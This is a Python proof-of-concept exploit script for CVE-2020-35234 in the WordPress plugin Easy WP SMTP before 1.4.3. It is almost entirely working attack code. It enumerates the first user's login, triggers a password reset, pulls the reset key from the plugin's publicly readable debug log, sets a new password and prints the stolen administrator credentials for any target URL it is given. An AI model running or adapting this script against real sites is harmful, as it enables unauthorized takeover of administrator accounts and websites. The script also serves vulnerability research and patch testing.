# Wordpress plugin Easy WP SMTP < 1.4.3 reset admin password exploit PoC
# by rivalsec https://github.com/rivalsec https://twitter.com/RivalSec
# CVE-2020-35234
#
# enable plugin debug option
# configure the SMTP settings
# smtp debug server: python -m smtpd -n -c DebuggingServer localhost:1025

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import re
import random
import string
from io import StringIO

ua = 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0'
headers = requests.utils.default_headers()
headers.update({'User-Agent': ua,})
proxies = None


def rand_str(c:int=16):
    return (''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(c)))


def truncated_stream_res(s: requests.Response, max_size_char:int = 1000000):
    readed = 0
    with StringIO() as buf:
        for chunk in s.iter_content(1024, True):
            readed += buf.write(chunk)
            if readed > max_size_char:
                break
        r = buf.getvalue()
    return r


def get_login(s:requests.Session, wpurl:str, index:int, timeout=30):
    """ by requests"""
    author_url = '{}?author={}'.format(wpurl, index)
    # try:
    with s.get(author_url, headers=headers, timeout=timeout, verify=False, stream=True, allow_redirects=False, proxies=proxies) as s:
        if 'location' in s.headers:
            locationre = re.search('/author/([^/]+)(/|$)', s.headers['location'])
            if locationre:
                return locationre.group(1)
            else:
                return 
        body = truncated_stream_res(s)
        rre = re.search(' author author-(\\w{1,50}) ', body)
        if rre:
            return rre.group(1)


def http_request(sess:requests.Session, url:str, postdata = None, timeout:int = 30):
    if postdata:
        with sess.post(url, data=postdata, headers=headers, timeout=timeout, verify=False, stream=True, allow_redirects=False, proxies=proxies) as r:
            return truncated_stream_res(r)
    else:
        with sess.get(url, headers=headers, timeout=timeout, verify=False, stream=True, allow_redirects=False, proxies=proxies) as r:
            return truncated_stream_res(r)


def process(url:str):
    url = url.rstrip('/')
    s = requests.Session()

    # check /wp-content/plugins/easy-wp-smtp/
    plugin_url = url + '/wp-content/plugins/easy-wp-smtp/'
    r = http_request(s, plugin_url)
    if 'class-easywpsmtp-admin.php' not in r:
        print('{} no Easy WP SMTP plugin or directory index off'.format(plugin_url))
        return False

    # get user 1
    user = get_login(s, url, 1)
    if not user:
        print("cant get login, use default 'admin'")
        user = 'admin'

    # lostpass request
    r = http_request(s, url + '/wp-login.php?action=lostpassword', {'user_login' : user})

    # search for Easy WP SMTP debug log file
    r = http_request(s, plugin_url)
    m = re.search('[0-9a-f]+_debug_log.txt', r)
    if m:
        log_fn = m.group(0)
    else:
        print('{} cant find Easy WP SMTP debug log file'.format(plugin_url))
        return False

    r = http_request(s, plugin_url + log_fn) #can be big?
    ms = re.findall('action=rp&key=([a-zA-Z0-9]+)&login=' + user, r)
    if not ms:
        print('cant find any reset password keys')
        return False
    # use last
    rp_key = ms[-1]

    new_pass = rand_str(8)
    rp_data = {
        'pass1': new_pass,
        'pass2': new_pass,
        'rp_key': rp_key
    }
    # post http://localwp1.aa/wp-login.php?action=resetpass
    http_request(s, url + '/wp-login.php?action=rp&key={}&login={}'.format(rp_key, user)) #cookie
    r = http_request(s, url + '/wp-login.php?action=resetpass', rp_data)
    if not r:
        print('cant reset password, invalid key')
        return False

    return {'url':url, 'user':user, 'passwd': new_pass}


if __name__ == "__main__":
    import argparse
     
    aparser = argparse.ArgumentParser("Easy WP SMTP reset admin password exploit")
    aparser.add_argument('-u', '--url', dest="url", help='wordpress site root url')
    aparser.add_argument('-dp', '--debugproxy', type=str, help='proxy for debugging (http://127.0.0.1:8080)')
    pargs = aparser.parse_args()
    
    if pargs.debugproxy:
        proxies = {
            'http': pargs.debugproxy,
            'https': pargs.debugproxy
        }


    try:
        res = process(pargs.url)
        print(res)
    except Exception as e:
        print(str(e))
